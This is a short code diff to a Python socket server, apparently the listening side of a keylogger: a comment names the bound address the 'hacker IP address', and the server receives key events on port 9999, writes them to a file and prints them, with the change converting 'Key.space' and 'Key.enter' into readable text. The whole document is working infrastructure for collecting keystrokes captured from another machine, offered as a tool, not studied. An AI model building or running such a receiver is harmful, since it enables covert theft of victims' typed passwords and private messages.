@@ -1,6 +1,6 @@
 import socket
 
-host = '' #hacker IP address in string
+host = '' #hacker IP address in string, actually don't need it
 port = 9999
 
 s = socket.socket()
@@ -20,5 +20,9 @@ while True:
     file_write(str(data))
     if not data:
         break
-    print(str(data))
+    if str(data) == 'Key.space':
+        data = ' '
+    if str(data) == 'Key.enter':
+        data = '\n'
+    print(str(data).strip("'"), end='', flush=True)
 conn.close()
